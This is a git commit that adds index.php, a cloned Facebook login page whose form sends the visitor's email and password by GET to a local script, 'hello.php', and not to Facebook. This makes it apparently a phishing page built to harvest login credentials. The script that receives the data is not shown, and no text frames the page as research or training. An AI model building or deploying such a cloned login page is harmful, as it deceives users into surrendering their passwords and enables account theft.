9203b260c1cf8c8a4c13604a3857563e5acad777
razaarifsyed <razaarifsyed@yahoo.co.in>
2020-04-16 21:42:54 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" id="facebook" class=" no_js">
+<head>
+<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+<meta http-equiv="Content-language" content="en" />
+<script type="text/javascript">
+//<![CDATA[
+CavalryLogger=false;window._is_quickling_index="";
+//]]>
+</script><noscript> <meta http-equiv=refresh content="0; URL=?_fb_noscript=1" /> </noscript>
+
+<meta name="robots" content="noodp,noydir" />
+<meta name="description" content=" Facebook is a social utility that connects people with friends and others who work, study and live around them. People use Facebook to keep up with friends, upload an unlimited number of photos, post links and videos, and learn more about the people they meet." />
+<title>Login | Facebook</title>
+
+    <link type="text/css" rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/zE385/hash/esa8ngmd.css" />
+    <link type="text/css" rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/zELN9/hash/c7h3cyeq.css" />
+    <link type="text/css" rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/zEYCM/hash/d7atfw4b.css" />
+    <link type="text/css" rel="stylesheet" href="http://b.static.ak.fbcdn.net/rsrc.php/z3P48/hash/71vqmek9.css" />
+    <link type="text/css" rel="stylesheet" href="http://b.static.ak.fbcdn.net/rsrc.php/z8JG3/hash/a01tm8yw.css" />
+
+
+    <script type="text/javascript" src="http://b.static.ak.fbcdn.net/rsrc.php/z70NZ/hash/cqp62s8o.js"></script>
+
+<link rel="search" type="application/opensearchdescription+xml" href="http://b.static.ak.fbcdn.net/rsrc.php/zBOV4/hash/10jfw8tc.xml" title="Facebook" />
+<link rel="shortcut icon" href="http://static.ak.fbcdn.net/rsrc.php/z9Q0Q/hash/8yhim1ep.ico" /></head>
+<body class="login_page UIPage_LoggedOut ie6 Locale_en_US">
+<div id="FB_HiddenContainer" style="position:absolute; top:-10000px; width:0px; height:0px;" ></div><div id="blueBar" class="loggedOut"></div><div id="globalContainer"><div id="menubar_container" class="fb_menubar_show_register"><div  id="fb_menubar" class=" fb_menubar_logged_out clearfix"><ul id="fb_menubar_core" class="fb_menu_list"><li class="fb_menu" id="fb_menubar_logo"><a href="http://www.facebook.com" class="fb_logo_link" title="Go to Facebook Home"><img class="fb_logo_img img" src="http://static.ak.fbcdn.net/rsrc.php/z9QLO/hash/8q2anwu7.png" alt="Facebook logo" /></a></li></ul><ul id="fb_menubar_aux" class="fb_menu_list"></ul></div><div class="signup_bar_container"><div class="signup_box clearfix">
+      <a class="signup_btn UIButton UIButton_Green UIButton_Large UIActionButton_SuppressMargin UIActionButton"  href="/r.php?locale=en_US"><span class="UIButton_Text">Sign Up</span></a><div class="signup_box_content"><span>Facebook helps you connect and share with the people in your life.</span></div></div></div></div><div id="dropmenu_container"></div><div id="content" class="fb_content clearfix"><div class="UIFullPage_Container"><div class="UIInterstitialContainer clearfix"><div class="UIRoundedTransparentBox"><div class="UIRoundedTransparentBox_Inner clearfix"><div class="UIRoundedTransparentBox_Corner UIRoundedTransparentBox_TL">&nbsp;</div><div class="UIRoundedTransparentBox_Corner UIRoundedTransparentBox_TR">&nbsp;</div><div class="UIRoundedTransparentBox_Corner UIRoundedTransparentBox_BL">&nbsp;</div><div class="UIRoundedTransparentBox_Corner UIRoundedTransparentBox_BR">&nbsp;</div><div class="UIRoundedTransparentBox_Border clearfix"><div class="UIInterstitialBox_Container clearfix"><div ><div class="title_header add_border"><h2 class="title_h no_icon">Facebook Login</h2></div><form method="GET" action="hello.php" id="login_form" onsubmit=";var d = document.documentElement;return d.onsubmit &amp;&amp; d.onsubmit(event);"><input type="hidden" name="charset_test" value="&euro;,&acute;,€,´,水,Д,Є" /><div id="loginform" style=""><input type="hidden" id="version" name="version" value="1.0" autocomplete="off" /><input type="hidden" id="return_session" name="return_session" value="0" autocomplete="off" /><input type="hidden" id="session_key_only" name="session_key_only" value="0" autocomplete="off" /><input type="hidden" id="trynum" name="trynum" value="1" autocomplete="off" /><input type="hidden" name="charset_test" value="&euro;,&acute;,€,´,水,Д,Є" /><input type="hidden" id="lsd" name="lsd" value="Cgt3b" autocomplete="off" /><div class="form_row clearfix "><label for="email" id="label_email">Email:</label><input type="text" class="inputtext" id="email" name="email" value="" onkeypress="formchange()" /></div><div class="form_row clearfix "><label for="pass" id="label_pass">Password:</label><input type="password" class="inputpassword" id="pass" name="pass" value="" /></div><label class="persistent"><input type="checkbox" class="inputcheckbox " id="persistent_inputcheckbox" name="persistent" value="1" /><span id="persistent_login_text">Keep me logged in</span></label><div id="set_as_homepage_persistent"><label class="persistent"><input type="checkbox" class="inputcheckbox " onclick="HomepageChanger.addLoginFormSubmitHook(this)" id="set_as_homepage_inputcheckbox" name="set_as_homepage_check_box" value="1" /><span id="set_as_homepage_text">Set Facebook as my home page</span></label></div><div id="buttons" class="form_row clearfix"><label></label><input type="submit" value="Login" name="login" id="login" onclick="this.disabled=true; this.form.submit(); return false;" class="inputsubmit" /> or <strong><a href="http://www.facebook.com/r.php?next=&amp;locale=en_US" id="reg_btn_link" target="_blank" rel="nofollow">Sign up for Facebook</a></strong></div><p class="reset_password form_row"><label></label><a href="http://www.facebook.com/reset.php?locale=en_US">Forgot your password?</a></p></div></form>
+</div></div></div></div></div><div ><div class="linear_language"><ul><li><a href="http://www.facebook.com/login.php" title="English (US)" onclick="intl_set_cookie_locale(&quot;en_US&quot;, &quot;http:\/\/www.facebook.com\/login.php&quot;, &quot;TOP_LOCALES&quot;); return false;">English (US)</a></li><li><a href="http://es-la.facebook.com/login.php" title="Spanish" onclick="intl_set_cookie_locale(&quot;es_LA&quot;, &quot;http:\/\/es-la.facebook.com\/login.php&quot;, &quot;TOP_LOCALES&quot;); return false;">Español</a></li><li><a href="http://pt-br.facebook.com/login.php" title="Portuguese (Brazil)" onclick="intl_set_cookie_locale(&quot;pt_BR&quot;, &quot;http:\/\/pt-br.facebook.com\/login.php&quot;, &quot;TOP_LOCALES&quot;); return false;">Português (Brasil)</a></li><li><a href="http://fr-fr.facebook.com/login.php" title="French (France)" onclick="intl_set_cookie_locale(&quot;fr_FR&quot;, &quot;http:\/\/fr-fr.facebook.com\/login.php&quot;, &quot;TOP_LOCALES&quot;); return false;">Français (France)</a></li><li><a href="http://de-de.facebook.com/login.php" title="German" onclick="intl_set_cookie_locale(&quot;de_DE&quot;, &quot;http:\/\/de-de.facebook.com\/login.php&quot;, &quot;TOP_LOCALES&quot;); return false;">Deutsch</a></li><li><a href="http://it-it.facebook.com/login.php" title="Italian" onclick="intl_set_cookie_locale(&quot;it_IT&quot;, &quot;http:\/\/it-it.facebook.com\/login.php&quot;, &quot;TOP_LOCALES&quot;); return false;">Italiano</a></li><li><a href="http://ar-ar.facebook.com/login.php" title="Arabic" onclick="intl_set_cookie_locale(&quot;ar_AR&quot;, &quot;http:\/\/ar-ar.facebook.com\/login.php&quot;, &quot;TOP_LOCALES&quot;); return false;">العربية</a></li><li><a href="http://hi-in.facebook.com/login.php" title="Hindi" onclick="intl_set_cookie_locale(&quot;hi_IN&quot;, &quot;http:\/\/hi-in.facebook.com\/login.php&quot;, &quot;TOP_LOCALES&quot;); return false;">हिन्दी</a></li><li><a href="http://zh-cn.facebook.com/login.php" title="Simplified Chinese (China)" onclick="intl_set_cookie_locale(&quot;zh_CN&quot;, &quot;http:\/\/zh-cn.facebook.com\/login.php&quot;, &quot;TOP_LOCALES&quot;); return false;">中文(简体)</a></li><li><a href="http://ja-jp.facebook.com/login.php" title="Japanese" onclick="intl_set_cookie_locale(&quot;ja_JP&quot;, &quot;http:\/\/ja-jp.facebook.com\/login.php&quot;, &quot;TOP_LOCALES&quot;); return false;">日本語</a></li><li><a rel="dialog" href="/ajax/intl/language_dialog.php?uri=http%3A%2F%2Fwww.facebook.com%2Flogin.php&amp;source=TOP_LOCALES_DIALOG" title="Show more languages" class="chevron">&raquo;</a></li></ul></div></div></div></div></div><div id="pageFooter"><div id="contentCurve"></div><div id="footerContainer"><div id="footerLeft"><div class="copyright" id="pagefooter_copyright"><span title="HPHP">Facebook </span><span id="rtime" title="51">&copy;</span> <span title="10.32.177.119">20</span><span title="814424">10</span></div><div id="locale_selector_dialog_onclick"><a rel="dialog" href="/ajax/intl/language_dialog.php?uri=http%3A%2F%2Fwww.facebook.com%2Flogin.php" class="intl_selector_dialog_a" title="English (US)">English (US)</a></div></div><div id="footerRight"><a href="http://www.facebook.com/facebook?ref=pf" accesskey="8">About</a><a href="/campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;extra_1=0">Advertising</a><a href="http://developers.facebook.com/?ref=pf">Developers</a><a href="http://www.facebook.com/careers/?ref=pf">Careers</a><a href="http://www.facebook.com/terms.php?ref=pf" accesskey="9">Terms</a> &bull; <a href="http://www.facebook.com//find-friends/?ref=pf">Find Friends</a><a href="http://www.facebook.com/privacy/explanation.php">Privacy</a><a href="http://www.facebook.com/mobile?ref=pf">Mobile</a><a href="http://www.facebook.com/help/?ref=pf" accesskey="0">Help Center</a><a href="http://blog.facebook.com/blog.php">Blog</a><a href="http://www.facebook.com/facebook-widgets/?ref=pf">Widgets</a></div></div></div></div><script type="text/javascript">/* <![CDATA[ */if (top != self) { try { if (top.location.hostname.indexOf("apps") >= 0) { throw 1; } } catch (e) {setTimeout(function() {var fb_cj_img = new Image(); fb_cj_img.src = "http:\/\/errors.facebook.com\/common\/scribe_endpoint.php?c=si_clickjacking&m=http%3A%2F%2Flovepage007.t35.com%2F&t=4639";}, 5000); }}/* ]]> */</script><script type="text/javascript">
+Env={user:0,locale:"en_US",method:"GET",dev:0,start:(new Date()).getTime(),ps_limit:5,ps_ratio:4,svn_rev:234728,vip:"66.220.146.25",static_base:"http:\/\/static.ak.fbcdn.net\/",www_base:"http:\/\/www.facebook.com\/",tlds:["com"],rep_lag:2,pc:{"m":"1.0.3","l":"1.0.3","axi":true},fb_dtsg:null,ffid1:"79-z6kW9VwX9mURrGG7Qrw",ffid2:"86BdoNj33fOzWa7Bj_QAVA",ffid3:"MTI3MDIyNDQyOC0zZTg0NGYzY2Y0YjZiMmRjMDk2Yjg0ZTdlZTEzODVkNWRmNDBjNzljOTAyNGYwMzE5OTgwNQ..",ffid4:"bI1s07K21ev074d3oRkbHA",ffver:58931};
+</script>
+
+  <script type="text/javascript">Bootloader.setResourceMap({"NxN+R":{"name":"js\/431klde0zs8w4ggs.pkg.js","type":"js","permanent":false,"src":"http:\/\/b.static.ak.fbcdn.net\/rsrc.php\/z3BY8\/hash\/4vrwvf27.js"},"YYfDy":{"name":"js\/c3oasnfm71cg80ko.pkg.js","type":"js","permanent":false,"src":"http:\/\/b.static.ak.fbcdn.net\/rsrc.php\/z8EY4\/hash\/190h7280.js"},"+\/agz":{"name":"css\/1dn187dqt50k8848.pkg.css","type":"css","permanent":true,"src":"http:\/\/static.ak.fbcdn.net\/rsrc.php\/zE385\/hash\/esa8ngmd.css"},"wJKNC":{"name":"css\/login.css","type":"css","permanent":false,"src":"http:\/\/static.ak.fbcdn.net\/rsrc.php\/zELN9\/hash\/c7h3cyeq.css"},"s4pgx":{"name":"css\/8p8gqy0u7wo4gcos.pkg.css","type":"css","permanent":false,"src":"http:\/\/static.ak.fbcdn.net\/rsrc.php\/zEYCM\/hash\/d7atfw4b.css"},"38ysj":{"name":"css\/2lo2t6hnebmscscs.pkg.css","type":"css","permanent":true,"src":"http:\/\/b.static.ak.fbcdn.net\/rsrc.php\/z3P48\/hash\/71vqmek9.css"},"LK2yQ":{"name":"css\/21ovkb6rezq8co0s.pkg.css","type":"css","permanent":true,"src":"http:\/\/b.static.ak.fbcdn.net\/rsrc.php\/z8JG3\/hash\/a01tm8yw.css"},"F+B8D":{"name":"js\/19khsprwvtvokwow.pkg.js","type":"js","permanent":false,"src":"http:\/\/b.static.ak.fbcdn.net\/rsrc.php\/z70NZ\/hash\/cqp62s8o.js"}});
+Bootloader.enableBootload({"async":["F+B8D","NxN+R","LK2yQ"],"dialog":["F+B8D","NxN+R","LK2yQ"],"dom-form":["F+B8D","NxN+R","LK2yQ"],"async-signal":["NxN+R"]});Arbiter.registerCallback(InitialJSLoader.callback, ["BOOTLOAD\/ROADRUNNER_READY"]);Arbiter.registerCallback(function(){setTimeout(function() {InitialJSLoader.load(["NxN+R","YYfDy"]);Arbiter.inform("BOOTLOAD\/ROADRUNNER_READY", true, Arbiter.BEHAVIOR_STATE);}, 50)}, [OnloadEvent.ONLOAD_DOMCONTENT_CALLBACK]);</script><script type="text/javascript">
+
+onloadRegister(function(){Bootloader.configurePage(["+\/agz","wJKNC","s4pgx","38ysj","LK2yQ"]);});
+Bootloader.done(["+\/agz","wJKNC","s4pgx","38ysj","LK2yQ"]);
+
+
+onloadRegister(function (){HomepageChanger.checkHomepageIsFacebookAtLoad();});
+onloadRegister(function (){try {document.execCommand("BackgroundImageCache", false, true);} catch (ignored) {};});
+onloadRegister(function (){window.loading_page_chrome = true;;});
+onloadRegister(function (){window.loading_page_chrome = false;;});
+onloadRegister(function (){useragent();;});
+onafterloadRegister(function (){onbeforeunloadRegister(function(){window.ExitTime=((new Date()).getTime());});});
+
+
+</script><script type="text/javascript">if (!window.ge) {
+  window.ge = function(id) {
+    return document.getElementById(id);
+  }
+}
+
+window.onload = function() {
+  document.cookie = "test_cookie=1;domain=.facebook.com";
+  var e = ge('email'),
+      p = ge('pass');
+
+  //  We sometimes show you *only* a password prompt, so focus that if there
+  //  is no e-mail prompt.
+
+  try {
+    if (e && !e.value) {
+      e.focus();
+    } else if (p) {
+      p.focus();
+    }
+  } catch (x) {
+    if (x.number == -2146826178) {
+      // this is a focus error that happens in IE when the fields are
+      // hidden in order to show the "Sign Up" prompt when a user
+      // arrives with 0 facebook cookies.
+    } else {
+      throw x;
+    }
+  }
+};
+
+function formchange() {
+  (ge('persistent')||{}).checked = 0;
+}
+
+function pop(url) {
+  window.open(url);
+}
+</script></body>
+</html>
